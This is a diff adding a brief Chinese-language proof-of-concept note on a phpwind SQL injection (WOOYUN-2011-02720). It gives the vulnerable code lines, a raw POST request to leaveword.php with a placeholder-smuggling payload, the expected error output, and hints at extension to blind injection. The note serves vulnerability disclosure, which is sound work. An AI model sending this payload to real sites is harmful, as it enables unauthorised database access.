@@ -1,0 +1,17 @@
+漏洞点：phpwind lib/utility/querybuilder.class.php 的 _parseStatement() 未处理 $atc_content 内的 SQL 占位符，且 actions/ajax/leaveword.php 第 31 行 S::gp(array('pid','atc_content','ifmsg'),'P') 未对 pid 强制 intval。
+
+第 78 行原代码（来自 WOOYUN-2011-02720）：
+  $db->update(pwQuery::buildClause("UPDATE :pw_table SET leaveword=" . S::sqlEscape($atc_content) . " $sqladd WHERE pid=:pid AND tid=:tid", array($pw_posts, $pid, $tid)));
+
+原始请求：
+  POST /actions/ajax/leaveword.php HTTP/1.1
+  Host: TARGET
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 33
+
+  pid=asd&atc_content=:pid&ifmsg=0
+
+预期（漏洞成立时）回显：
+  Query Error: UPDATE pw_posts SET leaveword= ''asd' ' WHERE pid= 'asd' AND tid= ''
+
+限制：phpwind 会替换 '=' 与 ')'，注入深度受限，主要用于报错型确认与盲注/时间盲注扩展。
